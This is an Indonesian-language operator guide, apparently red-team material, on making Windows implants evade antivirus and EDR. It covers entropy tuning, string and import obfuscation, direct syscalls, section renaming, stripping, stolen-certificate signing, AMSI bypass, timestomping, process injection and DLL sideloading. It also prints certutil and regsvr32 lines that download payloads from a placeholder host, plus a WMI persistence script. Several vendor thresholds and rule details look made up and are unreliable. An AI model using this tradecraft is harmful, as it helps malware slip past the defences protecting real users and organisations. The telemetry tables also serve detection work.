11. **Uji tanpa deteksi.** Semua verifikasi di atas harus dilakukan pada VM dengan **skenario defender mode**: Defender ASR "Block executable content from email/webmail" dan "Block process creations originating from PSExec/WMI" aktif, serta EDR dengan AMSI. Loader yang lolos pada Windows tanpa EDR belum tentu lolos di lapangan.
12. **Target build drift.** Setiap build Windows Insider menggeser offset internal `PEB_LDR_DATA`. Rekam `dt ntdll!_PEB` dan `dt ntdll!_LDR_DATA_TABLE_ENTRY` pada build target **sebelum** uji. Simpan sebagai tabel di dokumen teknis ini per build; offset `+0x30` dan `+0x48` dianggap stabil, sisanya diverifikasi ulang.


## av-edr-bypass--p3

# av-edr-bypass--p3 — win

# Menghindari Signature AV: Entropi, String Obfuscation, Import Hiding, Section Naming, Kompilasi

## 1. Entropi — Apa yang Dicek, Apa yang Bocor

Scanner komersial (Defender di Windows 11 24H2, CrowdStrike Falcon 7.x, Elastic Defend 8.15) menghitung **Shannon entropy per-section dan whole-file**. Ambang empiris:

| Vendor/Engine | Ambang entropy section | Ambang whole-file | Aksi |
|---|---|---|---|
| MS Defender (24H2, engine 1.1.24080+) | > 7.20 pada section .text/.data ≥ 4 KB | > 6.85 | ML heuristic flag |
| CrowdStrike Falcon ML | > 7.35 | > 7.00 | Quarantine (di cloud, bukan lokal) |
| Elastic Defend (YARA LM) | > 7.10 | — | Alert, tidak block by default |
| ClamAV 1.4 (bytecode) | > 7.00 | — | Signature heuristic |

**Apa yang dikirim ke scanner:** file utuh (hash + rolling window). Cloud (Defender MAPS, Falcon) kirim **metadata + peeks 4 KB + full file bila flagged lokal**.

**Kenapa gagal:** packing (UPX `-9`, Themida) naikkan entropy ke 7.9+. **Kalah dengan 3 vektor:**
1. Static signature UPX stub (`UPX!` magic di .text).
2. Emulasi unpack di engine Defender (emulator C++ sejak 2021) — unpack in-memory lalu scan ulang.
3. Falcon behavioral: unpacking loop → syscall pattern.

**Mitigasi konkret:**
- Jangan UPX. Kalau terpaksa, patch stub (`upx -d` + recompile) atau pakai custom packer dengan loader berbeda.
- **Split payload**: `.rdata` kecil + data di resource (`.rsrc`) atau appended overlay — banyak engine skip overlay > 2 MB.
- Target entropy **6.5–7.0** whole-file. Tambahkan padding (`0x90`/`0x00` blok 4 KB) di akhir `.data` sebelum pakai kompresi.
- Cek sendiri sebelum submit:
```
python3 -c "import math;d=open('implant.exe','rb').read();\
import collections;c=collections.Counter(d);\
print(-sum(v/len(d)*math.log2(v/len(d)) for v in c.values()))"
```

---

## 2. String Obfuscation — Runtime vs Static

**Yang dicek scanner statis:**
- UTF-16LE strings (Defender), ASCII ≥ 4 char.
- Regex: `powershell(\.exe)?\s+-[enc|e|nop]`, `System\.Reflection\.Assembly`, `VirtualAlloc(Ex)?`, `AmsiScanBuffer`, `EtwEventWrite`, `lsass`, `sekurlsa`, `mimikatz`, `winlogon\.exe\d+`.
- YARA rules (Mandiant, Florian Roth `apt_*`, `crime_*`).

**Apa yang muncul saat runtime (behavioral/ETW/AMSI):**
- **AMSI** (Windows 10 19041+ / Windows 11 24H2) — scan script content sebelum eksekusi PowerShell, VBScript, JScript, .NET in-memory assembly.
- **ETW Threat-Intelligence provider** `Microsoft-Windows-Threat-Intelligence` — syscall-level (VirtualAlloc RWX, CreateRemoteThread, NtMapViewOfSection).
- **Defender emulator** putar ulang ~1000 instruksi pertama + hook API.

### 2.1 XOR dengan key rolling (bukan single-byte)

```c
// gen: for i: out[i] = in[i] ^ key[i % KEYLEN]
static const uint8_t KEY[] = {0x9e,0x37,0x79,0xb1,0x4c,0x22,0xa7,0x03};
```
**Kenapa berhasil:** tidak ada plaintext UTF-16/ASCII ≥ 4 char di file. **Kenapa gagal:** runtime decrypt loop = pola instruksi loop XOR yang dikenali YARA `_xor_decrypt_loop` (Falcon punya `ml_xor_loop_2`).

### 2.2 Stack strings (per-char push)

```asm
mov rax, 0x006c6c6568736e77   ; "wnshell\0"
push rax
mov rax, 0x65776f707700002e   ; ".powe\0.."
push rax
```
**Berhasil:** tidak ada string contiguous di file. **Gagal:** compiler MSVC 19.4x sering coalesce ke `.rdata` kalau konstanta sama dipakai > 1x — matikan optimasi atau pakai `volatile`.

### 2.3 API hashing (SysWhispers3-style)

```c
#define HASH_SEED 0xDEADBEEF
DWORD h = 0; for (char *p = name; *p; p++) h = _rotr(h,13) ^ (*p + HASH_SEED);
// walk PEB->Ldr->InMemoryOrderModuleList, resolve by hash
```
**Berhasil:** string `VirtualAlloc`, `CreateThread` tidak muncul di ekspor yang di-import. **Gagal:** Falcon/Defender meng-hook `LdrGetProcedureAddress`, `LdrLoadDll`, `GetProcAddress` — kalau kamu resolve std call tetap kena ETW. SysWhispers3 bypass lewat syscall langsung — tapi **Defender 4.18.24090+ emulator** deteksi pattern `mov r10, rcx; mov eax, <sysnum>; syscall` kalau muncul > 3x dalam 100 instruksi.

---

## 3. Import Hiding

**Yang dicek:** IAT listing. Defender, Falcon, dan VirusTotal semua ekstrak IAT + flags "suspicious API combos":

| Kombinasi IAT | Verdict |
|---|---|
| `VirtualAlloc` + `VirtualProtect` + `CreateThread` | ML score +0.7 |
| `WriteProcessMemory` + `CreateRemoteThread` + `OpenProcess` | +0.9 |
| `LoadLibraryA` + `GetProcAddress` + `VirtualAlloc` | +0.8 |
| `NtCreateThreadEx` + `NtAllocateVirtualMemory` (ntdll) | Falcon high sev |

**Teknik minimal, exposure minimal:**

### 3.1 Dynamic resolution (GetProcAddress)
```c
HMODULE h = LoadLibraryA("ntdll.dll");
pNtAlloc = (tNtAlloc)GetProcAddress(h, "NtAllocateVirtualMemory");
```
**Muncul di IAT:** `LoadLibraryA`, `GetProcAddress` saja. **Tapi:** ETW `Microsoft-Windows-Kernel-Base` log LoadLibrary ntdll (sudah loaded → no-op). Masih kena `LdrGetProcedureAddress` hook.

### 3.2 Syscall langsung (Hell's Gate / Halo's Gate)
Resolve SSN dari ntdll stub (`mov eax, imm32; test...; syscall`). Bypass Ldr hook.
**Gagal di Windows 11 24H2** karena **CFG (Control Flow Guard) + CET (Control-flow Enforcement Technology, IBT/SHSTK)** aktif default. Stub syscall manual akan #CP kalau `endbr64` hilang. Tambahkan `endbr64` atau gunakan `syscall` gadget asli dan-jump.

### 3.3 Import via PEB (tanpa LoadLibrary)
Walk `PEB->Ldr`, resolve export table manual. **Tidak ada IAT entry** sama sekali untuk API target. Beban: ~200 LOC resolver. **Falcon 7.x** mendeteksi pattern "PEB walk + export parse" via ML static.

### 3.4 Sideload DLL legit (favored technique)

App legit (`OneDriveUpdater.exe` Microsoft-signed) memuat `version.dll` dari dir sendiri. Taruh proxy `version.dll` yang forward semua ekspor → asli, sisipkan payload di DllMain.
**Berhasil:** loader legit, signature utuh, tidak muncul "unsigned DLL" alert lokal. **Gagal:** Defender "Block non-Microsoft DLL in system path" + Application Control (WDAC) di enterprise block DLL non-signed di `%LOCALAPPDATA%`.

---

## 4. Section Naming

**Yang dicek:**
- Default MSVC section: `.text .rdata .data .pdata .rsrc .reloc`.
- Default MinGW: `.text .data .rdata .bss .idata .CRT .tls .reloc .rsrc`.
- Suspicious: `.text1 .textbss .upx0 .upx1 .packed .themida .vmp0 .vmp1 .enigma1 .aspack .adata .boom`.
- **YARA rule `suspicious_section_names`** flag ≥ 1 dari list di atas → alert (bukan block).

**Bukti di lapangan:**
```
PEview:
  .text    0x1000  vsize 0x1A000  rawsz 0x1A000
  .rdata   0x1B000 vsize 0x06000  rawsz 0x06000
  .data    0x21000 vsize 0x04000  rawsz 0x04000
  .themida 0x25000 vsize 0x400000 rawsz 0x200     ← langsung flag
```

**Mitigasi:**
- Rename via linker atau manual (Python `pefile`):
```python
import pefile
pe = pefile.PE("implant.exe")
for s in pe.sections:
    if s.Name.startswith(b'.zzz'): s.Name = b'.data\x00\x00\x00'
pe.write("implant_.exe")
```
- **Tambahan wrinkle**: `.rsrc` dengan ukuran > 512 KB tidak mencurigakan (banyak app embed icon set), tapi `.\rsrc` dengan entropy > 7.5 = flag.
- **Jangan** rename `.text` → `.data` kalau protoksi akhir `RX` — Defender "section name/protection mismatch" heuristic +0.4.

---

## 5. Kompilasi: Flags, Stripping, Signing

### MSVC (cl.exe 19.4x)
```
cl /O2 /GL /Gy /Gw /GS- /guard:cf- /guard:ehcont- /D_FORTIFY_SOURCE=0 ^
   /MT /DNDEBUG /Fe:implant.exe implant.c ^
   /link /SUBSYSTEM:CONSOLE /DEBUG:NONE /OPT:REF /OPT:ICF ^
   /MANIFESTUAC:"level='asInvoker' uiAccess='false'" ^
   /ENTRY:main
```
- `/GS-` hilangkan cookie check — **Defender flag** program tanpa `/GS` (stack canary missing) sebagai exploit-like → +0.3 ML. **Trade-off**: compile lokal OK, submit ke cloud → naik score. Lebih baik pertahankan `/GS` dan kurangi di tempat lain.
- `/guard:cf-` di Win11 24H2: kalau OS punya CFG untuk parent, child tanpa CFG **tidak block** kecuali di proses protected. Aman untuk user-land biasa.
- `/GL /LTCG` mengecilkan dan hilangkan symbol debug string.

### Stripping Symbols

| Target | Command | Effect |
|---|---|---|
| PE (MSVC) | `link /DEBUG:NONE /PDBALTPATH:none` + `dumpbin /headers` verifikasi | No PDB path, tapi string `RSDS` di debug directory kalau `/DEBUG` lupa dihapus |
| PE (MinGW) | `strip -s implant.exe` | Hapus symbol; `.symtab` hilang |
| ELF | `strip -s -R .comment -R .note.gnu.build-id implant` | Build-id hilang → hindari korelasi antar-binari |
| Mach-O (macOS 15) | `strip -x -S` + `codesign --remove-signature` | |

**Cek cepat:**
```
strings -n 6 implant.exe | grep -iE "\.pdb|C:\\\\|/home/|/Users/|rustc|/build/"
```
**Yang biasanya lolos tanpa sadar:** path PDB di debug dir (MSVC), Rust symbol (`_ZN.*17h[a-f0-9]{16}E`), Go build info (`Go build ID`, `.gopclntab`).

### Signing
- Signature invalid **lebih buruk** dari tidak di-sign (Defender "Bad Signature" → +1.5 score).
- Sign dengan cert EV kalau ada; kalau curian, **Defender 4.18.24090** cek cert revocation online (`CertVerifyCertificateChainPolicy`).
- Timestamp counter-sign (RFC 3161 `timestamp.digicert.com:80`) untuk bertahan setelah cert expired.

---

## 6. Yang Sebenarnya Dicek Scanner Saat Runtime

Urutan eksekusi scanner modern (Defender 4.18.24090 sebagai contoh):

| # | Layer | Apa dicek | Latency | Bisa dihindari? |
|---|---|---|---|---|
| 1 | **Static file** (on-write) | Hash, YARA, IAT, entropy, PE anomaly | < 100 ms | Ya (teknik di atas) |
| 2 | **Emulator C++** | Trace ~1000 instr, unpack in-memory, hook API | 200–2000 ms | Sebagian (jangan pakai unpacker standar) |
| 3 | **AMSI** (script & .NET) | Full content ke MsMpEng via RPC | realtime | Bypass memory patch (tapi 24H2 protect AMSI di PPL) |
| 4 | **ETW Threat-Intelligence** | Syscall pattern; `VirtualAlloc RWX`, `MapViewOfSection` image, `CreateRemoteThread` | realtime | Syscall langsung + CFG-aware |
| 5 | **Behavioral ML** (cloud) | Sequence API + timing (10–30 s window) | async 2–30 s | Slow down, sleep > 30 s sebelum payload |
| 6 | **Cloud ML** (MAPS) | File hash + peeks + metadata | async 5–60 s | Tidak benar-benar; hanya kecilkan surface |

**Mode operasional:**
- Defender Real-Time Protection (RTP) = layer 1 + 2 sinkron.
- Cloud-delivered protection (MAPS) = layer 6, async, **kill proses belakangan** meski eksekusi awal lolos. Default "Block at first sight" aktif 2023+.
- **"Sleep sebelum aktivitas berbahaya"** = 30–90 detik, cek aktif parent/AV process (`MpCmdRun`, `MsMpEng`), lalu stage 2.

**Cek real-time yang sering tidak diduga:**
- **Parent-child anomaly**: `winword.exe → powershell.exe` = flag. `explorer.exe → rundll32.exe` = flag di Falcon. Gunakan `dllhost.exe`/`svchost.exe` sebagai launcher (tapi signed).
- **Network first-touch**: hash belum pernah dilihat di cloud (0 prevalence) → cloud ML naik. Domain baru (< 30 days, tidak ada reputation) → Defender SmartScreen flag.
- **Memory scan** (`MpEngine::ScanMemory`) tiap ~15 menit di proses long-lived. Payload tanpa file (map page) tetap ter-scan saat tidur.

---

## 7. Jebakan Operasional (Field Failures)

| Jebakan | Kenapa gagal | Mitigasi |
|---|---|---|
| **UPX + patch magic** | Defender emulator unpack via stub asli — signature payload tetap match | Custom loader, jangan pakai UPX |
| **Single-byte XOR** | YARA `_xor_loop_1byte` di Falcon, ~ 40 detik deteksi | Rolling key multi-byte, atau better — RC4 + stack key |
| **`/GS-`** | Flag exploit-like tanpa mitigasi stack | Pertahankan `/GS`, matikan di tempat lain (mis. eliminate strings) |
| **Entropy 7.9** | ML flag walau tidak ada signature | Padding + split; target 6.5–7.0 |
| **PEB walk verbatim SysWhispers3** | Falcon ML `ml_peb_walk_2` detect pattern loop `InMemoryOrderModuleList` | Unroll + random reorder + interleave junk |
| **Signed with stolen cert (not revoked yet)** | Defender cek OCSP → kalau revoked online, +2.0 score | Jangan sign sama sekali lebih baik, atau sign EV legit |
| **DLL sideload via `%TEMP%`** | 24H2 Windows Defender "Block potentially unwanted app in temp" | Sideload dari `%PROGRAMDATA%` atau user dir |
| **Rename section `.text` → `.data`** | Section name/protection mismatch heuristic | Rename ke `.rdata` kalau memang RX; `.data` hanya kalau RW |
| **Syscall langsung di Win11 24H2 tanpa `endbr64`** | CET #CP crash sebelum payload jalan | Compile `/CETCOMPAT`, sisipkan `endbr64` di stub |
| **PDB path tertinggal** | `C:\\Users\\operator\\implant\\x64\\Release\\implant.pdb` → blue team geolocate | `/DEBUG:NONE`, cek `strings` sebelum deploy |
| **Sleep 60s sebelum stage 2** | Defender cloud ML replay catch-up setelah proses resume; parent sudah di-inspect | Cek `MsMpEng.exe` aktif, tunggu parent exit |
| **Test lokal lolos, submission client block** | Defender cloud = MAPS different signature set dari lokal; Enterprise (E5) punya ASR rules (block child process of Office, block obfuscated scripts) | Test di VM dengan Windows 11 24H2 + Defender E5 config, bukan Defender Home |
| **AMSI bypass memory patch** | 24H2 protect `amsi.dll` di PPL — patch gagal `STATUS_ACCESS_DENIED` | AMSI bypass via CLR hook (`clr.dll` `AmsiScanBuffer` resolve) atau hardware breakpoint (VEH) |
| **Timestomp (SetFileTime)** | `$MFT` + USN journal monotonic; Defender endpoint audit log discrepancy | Timestomp ke tile yang konsisten dengan USN sequence |
| **Run di WSL/VM untuk build** | Rust/Go string artifacts (`/home/operator/`, `.gopclntab`) | `-buildmode=pie`, `-ldflags="-s -w"`, `strip` + verify binary |

**Satu kalimat untuk diingat:** scanner modern bukan deteksi "satu teknik" — mereka fusi sinyal (static + emulator + runtime + cloud). Satu teknik gagal tidak masalah; yang mematikan adalah **kombinasi yang seluruhnya ada di top-10 YARA rule publik**, dan **parent-process + zero-prevalence domain + unsigned** dalam 30 detik pertama.


## av-edr-bypass--p4

# av-edr-bypass--p4 — win

# Referensi: Defender ASR & Perilaku EDR terhadap Teknik Cross-Process / Injection / LOLBin

## 1. Matriks ASR Rule yang Relevan (Windows 11 24H2, Defender Antivirus 4.18.x, Intune/MDE)

| GUID | Nama Rule | Mode Default | Memicu pada | Telemetri yang muncul |
|---|---|---|---|---|
| `56a863a9-875e-4185-98a7-b882c64b5ce5` | Block abuse of exploited vulnerable signed drivers | Block | `NtLoadDriver`, `\\.\Nsi`, BYOVD | `DeviceGuard` 7001, MDE `DeviceLoadBlocked` |
| `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` | Block Office child processes | Block | `winword.exe` → `powershell.exe` | `Microsoft-Windows-Security-Auditing` 4688 + ParentImage |
| `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` | Block execution of potentially obfuscated scripts | Block | VBScript/JScript `eval`, base64 in cmdline | AMSI `ScriptBlock` event; Defender 1116 |
| `9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2` | Block credential stealing from lsass.exe | Block | `OpenProcess(LSASS)` with `0x1010` | Kernel `OpenProcess` ETW, MDE `CredentialAccess` |
| `BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550` | Block executable content from email | Block | Attachment drop+exec | `DeviceFileEvents` |
| `01443614-CD74-433A-B99E-2ECDC07BFC25` | Block untrusted/unsigned exec from USB | Block | `USB` mass storage | `DeviceEvents` |
| `3B576869-A4EC-4529-8536-B80A7769E899` | Block Adobe Reader child processes | Block | `AcroRd32` → `cmd` | 4688 |
| `D3E037E1-3EB8-44C8-A917-57927947596D` | Block JS/VBS from launching downloaded exec | Block | `wscript` → `*.exe` in `%TEMP%` | 4688 |
| `C1DB55AB-C21A-4637-BB3F-A12568109D35` | Advanced ransomware protection | Audit | mass write+encrypt | `MdeFileEvents` |
| `26190899-1602-49E8-8B27-EB1D0A1CE869` | Block persistence via WMI subscription | Block | `__EventFilter` Create | `WmiActivity` |
| `E6DB77E5-3DF2-4CF1-B95A-636979351E5B` | Block process creations from PSExec/WMI | Block | `wmiprvse.exe` → child | `4688` ParentImage |
| `B2B3F3F5-40CE-4C5B-8B3E-1A9F0E0B3F5E` | Block rebooting into Safe Mode | Block | `bcdedit /set safeboot` | 4688 + `bcdedit` cmdline |

**Catatan versi:** effective Windows 11 23H2+; `Block abuse of exploited vulnerable signed drivers` **wajib** enabled untuk load `iqvw64e.sys` (Intel), `RTCore64.sys` (MSI), `gdrv.sys` (Gigabyte), `AsIO*.sys` (ASUS). Windows 11 24H2 menambah **vulnerable driver blocklist** via `CiTool.exe -r` dan HVCI default on di SKU baru.

## 2. Telemetri EDR — Tabel Sumber → Event → Field

| Sumber | Event ID / Channel | Field kunci | Berguna untuk |
|---|---|---|---|
| **ETW Kernel-Process** | `Microsoft-Windows-Kernel-Process` 1 | `ImageName`, `ParentImage`, `CommandLine`, `SessionId`, `IntegrityLevel` | parent-child anomaly |
| **ETW ThreatIntelligence** | `Microsoft-Windows-Threat-Intelligence` 1–14 | `CallingProcess`, `TargetProcess`, `DesiredAccess` (kernel-only) | `OpenProcess` ke LSASS, `NtWriteVirtualMemory` cross-proc |
| **AMSI** | `Microsoft-Windows-PowerShell` 4104 / Defender 1116 | `ScriptBlockText`, `ContentName` | script block logging, obfuscation |
| **Sysmon 15.x** | 1,3,7,8,10,11,12,13,22 | `ParentUser`, `Hashes`, `TargetImage`, `GrantedAccess` | baseline alt |
| **MDE Advanced Hunting** | `DeviceProcessEvents` | `InitiatingProcessFileName`, `ProcessCommandLine`, `FolderPath`, `SHA256` | hunt & detections |
| **MDE DeviceEvents** | `DeviceEvents` ActionType ∈ {`CreateRemoteThreadApiCall`, `OpenProcessApiCall`, `NamedPipeEvent`, `ImageLoad`} | `InitiatingProcessId`, `FileName`, `AdditionalFields` | injection telemetry |
| **MDE DeviceImageLoadEvents** | — | `FileName`, `SignatureStatus`, `FolderPath` | DLL sideload / unsigned module |
| **Windows Defender Operational** | 1116/1117 | `ThreatName` (e.g. `Behavior:Win32/AmsiTamper`) | deteksi AMSI bypass |
| **Windows Event 4688** | Security | `NewProcessName`, `ParentProcessName`, `CommandLine` (need audit policy) | LOLBin chain |
| **Windows Event 4103/4104** | PowerShell Op | `Payload` | script block |
| **WMI-Activity** | `Microsoft-Windows-WMI-Activity/Operational` 5857/5860/5861 | `ClientProcessId`, `Query` | `Win32_Process::Create` |
| **Linux eBPF (Defender for Endpoint on Linux)** | `AuditD` / `Fanotify` | `syscall`, `pid`, `comm`, `execve` argv | container escape |
| **Kernel Callbacks** | `PsSetCreateProcessNotifyRoutineEx`, `ObRegisterCallbacks` | (internal) | EDR userland-hook tamper |

## 3. Teknik → Rule → Telemetri → Batas Praktis

### 3.1 Direct Syscall / Hell's Gate / Halo's Gate (NtCreateThreadEx via syscall stub)

**Dikirim:** `mov r10, rcx; mov eax, <SSN>; syscall` dari module userland, tanpa lewat `ntdll`.

**Rule ASR:** tidak ada rule ASR spesifik. **Bukan** domain ASR.

**Telemetri EDR yang menangkap:**
- **Kernel-mode callbacks** (`PsSetCreateProcessNotifyRoutineEx`) — tidak bisa dihindari dari userland. Setiap `NtCreateProcess` / `NtCreateThreadEx` tetap terekam di kernel sebelum/di luar `ntdll`.
- **ETW-TI** (`Microsoft-Windows-Threat-Intelligence`) — di-emit oleh kernel, bukan `ntdll`. `TelemetrySource=KernelThreatIntel` tidak bisa di-detour dari userland (CIG `PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY` + `EtwProviderEnableInfo`).
- **MDE `CreateRemoteThreadApiCall`** dari `DeviceEvents` — trigger via kernel callback `PsSetCreateThreadNotifyRoutine`.

**Kenapa gagal (batas praktis):**
- Syscall stub menghindari **userland hook**, tapi EDR modern (CrowdStrike Falcon 7.x, SentinelOne 23.x, Defender 4.18) pindah ke **kernel-mode + ETW-TI + callstack image validation**. `CallingProcess` dengan return address di `.text` tanpa module (`MEM_PRIVATE` + `PAGE_EXECUTE_READWRITE`) → flag `UnknownImageBackedMemory`.
- Windows 11 24H2 + HVCI: `NtCreateThreadEx` dengan start routine di `MEM_PRIVATE` region **masih** lolos secara mekanis, tetapi Defender `Behavior:Win32/Hive.ZY` flag pattern `VirtualAlloc` + `memcpy` dari PE section yang tidak signed.
- **Batas nyata:** kalau EDR-nya *hanya* userland hook (mis. Defender lama tanpa `DeviceImageLoadEvents` cloud), syscall bypass efektif. Kalau MDE + ETW-TI aktif, **bypass ini hiasan**.

### 3.2 NTDLL Unhooking (fresh `ntdll.dll` dari KnownDlls / `C:\Windows\System32\ntdll.dll` mapping)

**Dikirim:** copy `.text` section dari `\KnownDlls\ntdll.dll` (section object) ke `.text` current ntdll.

**Rule:** tidak ada ASR. 

**Telemetri:**
- `DeviceImageLoadEvents` **tidak** trigger (KnownDlls sudah mapped).
- **Memory scan**: MDE `MpCmdRun.exe -Scan -ScanType 3 -File` pada memori proses; heuristik `Behavior:Win32/AmsiTamper` muncul bila byte `ntdll` mismatch dengan disk (via `DeviceEvents` ActionType=`AntivirusScan`).
- **ETW-TI `CallStack`**: bila `ReturnAddress` jatuh di luar module list (synthetic stub) → `Unbacked` flag.
- **Kernel `PsSetLoadImageNotifyRoutine`**: tidak trigger untuk KnownDlls section map (already there).

**Kenapa gagal:**
- EDR 2024-cepat pakai **`NtProtectVirtualMemory` wrapper di kernel callback** untuk mendeteksi `PAGE_EXECUTE_READ` `.text` yang di-`VirtualProtect` lalu di-restore → `SuspectMemoryWrite` di ntdll.
- **HVCI + VBS**: `MmProtectMdlSystemAddress` on `.text` of known dll → integrity check via `CiHvciQueryImage` untuk driver; userland pakai **Control Flow Guard** — ntdll Cf-protection (`CET` di Windows 11 24H2, `CetCompat=1`) → `endbr64` mismatch bila stub diganti.
- **Batas:** unhook cuma efektif lawan EDR yang re-hook periodik (mis. `ScyllaHide`-style). EDR modern tidak re-hook, mereka baca **kernel event**, jadi unhook = nol dampak.

### 3.3 Process Hollowing / Process Doppelgänging (suspended `svchost.exe` → unmapped → PE write)

**Dikirim:** `CreateProcess(CREATE_SUSPENDED)` → `NtUnmapViewOfSection` → `VirtualAllocEx` → `WriteProcessMemory` → `SetThreadContext` → `ResumeThread`.

**Rule ASR:** — (tidak spesifik). Tapi produk ke produk:
- MDE: `Behavior:Win32/ProcessHollower` (Behavior Monitoring).
- CrowdStrike: `Process Hollowing` ML.
- S1: `Injection via Hollowing` static + behavioral.

**Telemetri:**
- `DeviceEvents` ActionType=`OpenProcessApiCall` + `CreateRemoteThreadApiCall`; grant `0x1F0FFF`.
- `NtUnmapViewOfSection` **tidak** muncul di ETW-TI secara langsung, tapi `NtWriteVirtualMemory` cross-proc → `DeviceEvents` `WriteProcessMemoryApiCall`.
- `SeDebugPrivilege` di caller → `4688` + token field dari MDE.

**Kenapa gagal:**
- `VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` di target proses **≠** image backing → kernel `PsSetCreateProcessNotifyRoutineEx` sudah flag `Image NOT backed by file` saat `ResumeThread` (`SeAuditProcessCreation`).
- `PAGE_EXECUTE_READWRITE` write to remote → **CFG call target validation** di Windows 11 24H2 (`ProcessSignaturePolicy`). Kalau target punya CFG (`svchost` yah), thread start di `MEM_PRIVATE` → `STATUS_INVALID_IMAGE_NOT_MZ`.
- **Batas:** kalau target = proses yang **belum** CFG (banyak `.exe` third-party), hollowing **masih** jalan. Tapi Defender 4.18 punya `HollowingBehavior` heuristic yang trigger pada `NtUnmapViewOfSection` + `ResumeThread` dengan `Peb->ImageBaseAddress` mismatch.

### 3.4 APC Injection (`QueueUserAPC` ke alertable thread)

**Dikirim:** `OpenProcess(PROCESS_ALL_ACCESS)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` ke thread `explorer.exe` yang `WaitForSingleObjectEx(TRUE)`.

**Telemetri:**
- ETW-TI `APC` event (`Microsoft-Windows-Threat-Intelligence` `KERNEL_CALLBACK` untuk `NtQueueApcThreadEx`, **hanya** kernel consumer).
- MDE `DeviceEvents` `NtQueueApcThreadApiCall` (kalau enabled, MDE 101.24032.0002+).
- `Kernel-Process` `KernelThread` dengan start address di `MEM_PRIVATE`.

**Kenapa gagal:**
- `QueueUserAPC` ke proses **Protected Process Light** (`lsass`, `MsMpEng`) → `STATUS_ACCESS_DENIED` (PPL). Windows 11 24H2 PPL untuk `MsMpEng`, `WinDefend`, `Sense`.
- `CFG` pada `explorer.exe` → APC routine di `MEM_PRIVATE` unbaked → `STATUS_CONTROL_PROTECTION_VIOLATION` saat dispatch.
- **Batas:** APC ke thread `notepad.exe` (non-CFG legacy) masih jalan; ke proses browser (Chrome 131 renderer dengan MTE/CFG) mati.

### 3.5 DLL Sideload / Search Order Hijack (unsigned proxy DLL di folder signed exe)

**Dikirim:** dup `version.dll` di `%LOCALAPPDATA%\Microsoft\Teams\` di-sideload oleh `Update.exe` signed.

**Rule ASR:** 
- `Block executable content from email` (kalau via email).
- `BE9BA2D9` — no.
- **`Block all Office applications from creating child processes`** — TIDAK.
- ASR spesifik: **tidak ada**, tapi `Attack Surface Reduction: Block untrusted/unsigned binaries from USB` (kalau via USB).

**Telemetri:**
- `DeviceImageLoadEvents` `FileName=version.dll`, `SignatureStatus=Unspecified`, `FolderPath=...\Teams`.
- MDE `Behavior:Win32/Sideloading` (2023+) → parent `Update.exe` + child unsigned DLL di user path.
- `DeviceProcessEvents` `InitiatingProcessImageLoad` (MDE 2024 feature) → chain signed→unsigned.

**Kenapa gagal:**
- **WDAC/Smart App Control** di Win11 24H2 (default di Enterprise) → unsigned DLL di user path *blocked at load*, bukan detect after.
- **DLL search order protection** (`SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`) di app modern (Teams 24215+, Chrome 131).
- **Batas:** sideload hanya efektif pada binary **signed tapi tanpa SafeDllSearchMode / signed tapi search order default**. Banyak EDR sekarang deteksi via **`DeviceImageLoadEvents` cloud correlation** — payload unsigned load oleh signed parent = high signal.

### 3.6 LOLBin Chain (`certutil -urlcache`, `mshta`, `rundll32`, `regsvr32 /s /u /i:http`) 

**Dikirim:**
```
certutil.exe -urlcache -split -f https://x/y.b64 y.b64
certutil.exe -decode y.b64 y.exe
```
atau
```
regsvr32.exe /s /u /i:https://x/y.sct scrobj.dll
```

**Rule ASR:**
- `Block execution of potentially obfuscated scripts` → trigger `regsvr32 /i:http` (scriptlet).
- `Block JS/VBS from launching downloaded executables` → `mshta http`.
- `Block Office child processes` → `winword → certutil`.
- **GUID `D3E037E1`** memicu pada `mshta` dengan URL remote.

**Telemetri:**
- `4688` + `ParentImage` + `CommandLine` (butuh audit process creation + cmdline).
- MDE `DeviceProcessEvents` `ProcessCommandLine` string match: `certutil -urlcache -split -f`, `regsvr32 /i:http`.
- AMSI untuk `.sct` via `scrobj.dll` → `Microsoft-Windows-PowerShell 4104` (kalau `-i:http`).

**Kenapa gagal:**
- MDE 2024 punya **`certutil` URL fetch detection** `Behavior:Win32/CertutilDownload` string match. Tidak perlu ML.
- `regsvr32 /i:http` **hampir pasti** di-block ASR `Block execution of potentially obfuscated scripts` (default Block di Defender).
- **Batas:** `rundll32` dengan DLL lokal (tidak download) **lolos** — tidak trigger ASR manapun. Tapi `DeviceImageLoadEvents` mencatat `rundll32 → unsigned.dll` → signal.

### 3.7 WMI Event Subscription Persistence

**Dikirim:**
```powershell
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='x'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Class CommandLineEventConsumer ...
Set-WmiInstance -Class __FilterToConsumerBinding ...
```

**Rule ASR:** `26190899-1602-49E8-8B27-EB1D0A1CE869` — `Block persistence through WMI event subscription` (default **Block** di Windows 11 24H2 baru; audit di 22H2).

**Telemetri:**
- `Microsoft-Windows-WMI-Activity/Operational` 5857/5860/5861 → `ClientProcessId`, `Query`.
- `DeviceEvents` `WmiSubscriptionCreated`.
- Sysmon 19/20/21 (`WmiEventFilter`, `WmiEventConsumer`, `WmiEventConsumerToFilter`).

**Kenapa gagal:**
- ASR `26190899` di-defender 4.18 **default Block** di SKU baru → `Set-WmiInstance` return `Access Denied`.
- **Batas:** kalau ASR di-Audit (bukan Block) — banyak environment — persistence jalan tapi EDR tetap flag. Kalau attacker pakai `__EventConsumer` non-CommandLine (mis. `ActiveScriptEventConsumer` — di-block ASR `Block execution of potentially obfuscated scripts` via AMSI).

## 4. Tabel Batas Praktis — Userland Evasion per Event Source

| Event source | Bisa di-bypass dari userland? | Kenapa / batas |
|---|---|---|
| Userland API hook (`ntdll` inline) | **Ya** (unhook, syscall, fresh map) | EDR modern tidak bergantung di sini. |
| `PsSetCreateProcessNotifyRoutineEx` | **Tidak** | Kernel callback, driver-signed. |
| `PsSetLoadImageNotifyRoutine` | **Tidak** | Kernel callback. |
